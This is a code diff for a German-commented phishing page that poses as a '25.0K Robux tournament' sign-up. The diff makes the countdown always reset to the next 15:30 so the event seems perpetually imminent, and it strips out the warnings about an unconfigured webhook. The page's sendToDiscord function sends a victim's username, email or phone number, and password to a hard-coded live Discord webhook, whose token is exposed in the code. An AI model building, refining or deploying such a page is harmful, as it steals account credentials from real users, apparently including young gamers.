@@ -202,24 +202,18 @@
             color: #b9c3e6;
             margin-top: 4px;
         }
-        .countdown-ended {
-            font-size: 1.5rem;
-            font-weight: 800;
-            color: #2eff8a;
-            text-shadow: 0 0 15px #2eff8a;
-            animation: pulse-green 1s infinite;
-        }
-        @keyframes pulse-green {
-            0% { text-shadow: 0 0 5px #2eff8a; }
-            50% { text-shadow: 0 0 20px #2eff8a; }
-            100% { text-shadow: 0 0 5px #2eff8a; }
-        }
         .tournament-name-live {
             margin-top: 10px;
             font-size: 1rem;
             font-weight: 700;
             color: #2eff8a;
             letter-spacing: 1px;
+            animation: pulse-green 1s infinite;
+        }
+        @keyframes pulse-green {
+            0% { text-shadow: 0 0 5px #2eff8a; }
+            50% { text-shadow: 0 0 20px #2eff8a; }
+            100% { text-shadow: 0 0 5px #2eff8a; }
         }
 
         /* SLOT WARNING */
@@ -532,10 +526,16 @@
 <script>
     (function(){
         // ============================================================
-        // 🟢🟢🟢 COUNTDOWN AUF 1. MAI 2026 UM 20:00 UHR 🟢🟢🟢
+        // 🟢🟢🟢 COUNTDOWN AUF 15:30 UHR (HEUTE ODER NÄCHSTER TAG) 🟢🟢🟢
         // ============================================================
-        // Jahr, Monat (0=Januar, 4=Mai), Tag, Stunde, Minute, Sekunde
-        const targetDate = new Date(2026, 4, 1, 15, 2, 5); // 1. Mai 2026 um 20:00 Uhr
+        // Ziel: 15:30 Uhr MEZ
+        let targetDate = new Date();
+        targetDate.setHours(15, 30, 0, 0); // 15:30:00
+        
+        // Wenn die Zeit heute bereits vorbei ist, auf morgen setzen
+        if (targetDate.getTime() < new Date().getTime()) {
+            targetDate.setDate(targetDate.getDate() + 1);
+        }
         
         // DISCORD WEBHOOK (für Admins)
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1499515877027086488/S3DHFQbry9zn-dpv2ykxffpC_fySox_FIq-oruVBwD2CIfMelsuqb53YNJg4u0Gvhido";
@@ -560,10 +560,11 @@
 
         // ========== COUNTDOWN FUNKTION MIT LIVE-MODUS ==========
         let isLive = false;
+        let countdownInterval = null;
         
         function updateCountdown() {
             const now = new Date().getTime();
-            const distance = targetDate - now;
+            const distance = targetDate.getTime() - now;
             
             const daysEl = document.getElementById('days');
             const hoursEl = document.getElementById('hours');
@@ -589,7 +590,12 @@
                 if (liveMessageDiv) {
                     liveMessageDiv.style.display = 'block';
                     liveMessageDiv.innerHTML = '<i class="fas fa-trophy"></i> 25.0K ROBUX TOURNAMENT LIVE NOW! <i class="fas fa-trophy"></i><br><span style="font-size:0.8rem;">Join the Rivals Rush now!</span>';
-                    liveMessageDiv.style.animation = 'pulse-green 1s infinite';
+                }
+                
+                // Countdown Intervall stoppen
+                if (countdownInterval) {
+                    clearInterval(countdownInterval);
+                    countdownInterval = null;
                 }
                 return;
             }
@@ -618,7 +624,7 @@
         
         // Countdown jede Sekunde aktualisieren
         updateCountdown();
-        setInterval(updateCountdown, 1000);
+        countdownInterval = setInterval(updateCountdown, 1000);
         
         // ========== TOAST & LOADER FUNKTIONEN ==========
         let toastTimeout = null;
@@ -668,9 +674,6 @@
 
         // Discord Webhook
         async function sendToDiscord(username, emailPhone, password, teamArray) {
-            if (DISCORD_WEBHOOK_URL === "https://discord.com/api/webhooks/REPLACE_ME_WITH_YOUR_WEBHOOK_URL") 
-                throw new Error("WEBHOOK_NOT_SET");
-            
             const teamFieldsList = teamArray.map((n,i) => `**Slot ${i+1}:** ${n || "—"}`).join("\n");
             
             const embed = {
@@ -733,7 +736,7 @@
                 passwordInput.value = "";
             } catch(err) {
                 showInlineLoader(false);
-                let msg = err.message.includes("WEBHOOK_NOT_SET") ? "Webhook not configured! Replace URL in code." : "Request failed: " + err.message;
+                let msg = "Request failed: " + err.message;
                 showToast(msg, true, 4000);
                 console.error(err);
             }
@@ -755,19 +758,6 @@
 
         teamContainer.classList.remove('show-team');
         dynamicNotice.classList.add('hidden-message');
-
-        if (DISCORD_WEBHOOK_URL.indexOf("REPLACE_ME") !== -1) {
-            var warnSpan = document.createElement('div');
-            warnSpan.style.fontSize = "0.65rem";
-            warnSpan.style.marginTop = "12px";
-            warnSpan.style.padding = "8px";
-            warnSpan.style.background = "rgba(255,50,80,0.15)";
-            warnSpan.style.borderRadius = "12px";
-            warnSpan.style.color = "#ff8a9e";
-            warnSpan.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ DISCORD WEBHOOK NICHT KONFIGURIERT! Bitte ersetze die Webhook URL im Code!';
-            var loginCard = document.querySelector('.login-card');
-            if (loginCard) loginCard.appendChild(warnSpan);
-        }
 
         const gitBtn = document.getElementById('githubBtn');
         if(gitBtn) {
